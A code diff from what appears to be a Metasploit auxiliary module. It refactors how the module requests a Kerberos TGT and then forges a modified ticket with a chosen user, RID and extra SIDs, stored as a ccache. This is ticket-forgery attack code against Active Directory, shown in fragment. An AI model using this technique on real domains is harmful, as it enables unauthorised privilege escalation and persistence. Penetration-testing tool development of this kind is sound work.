@@ -146,24 +146,29 @@ class MetasploitModule < Msf::Auxiliary
     validate_key!
 
     begin
+      domain = datastore['DOMAIN']
       options = {
+        server_name: "krbtgt/#{domain}",
+        client_name: datastore['REQUEST_USER'],
+        password: datastore['REQUEST_PASSWORD'],
+        realm: domain,
         stop_if_preauth_not_required: false
       }
       enc_key, enc_type = get_enc_key_and_type
       include_crypto_params(options, enc_key, enc_type)
 
-      res = kerberos_authenticator.request_tgt_only(options)
+      tgt_result = send_request_tgt(**options)
     rescue ::Rex::Proto::Kerberos::Model::Error::KerberosError => e
       print_error("Requesting TGT failed: #{e.message}")
       return
     end
 
-    if res.krb_enc_key[:enctype] != enc_type
-      print_error("Response has incorrect encryption type (#{res.krb_enc_key[:enctype]})")
+    if tgt_result.krb_enc_key[:enctype] != enc_type
+      print_error("Response has incorrect encryption type (#{tgt_result.krb_enc_key[:enctype]})")
       return
     end
 
-    ticket = modify_ticket(res.as_rep.ticket, res.decrypted_part, datastore['USER'], datastore['USER_RID'], datastore['DOMAIN'], extra_sids, enc_key, enc_type, enc_key, false)
+    ticket = modify_ticket(tgt_result.as_rep.ticket, tgt_result.decrypted_part, datastore['USER'], datastore['USER_RID'], datastore['DOMAIN'], extra_sids, enc_key, enc_type, enc_key, false)
     ticket = Msf::Exploit::Remote::Kerberos::Ticket::Storage.store_ccache(ticket, framework_module: self, host: datastore['RHOST'])
 
     if datastore['VERBOSE']
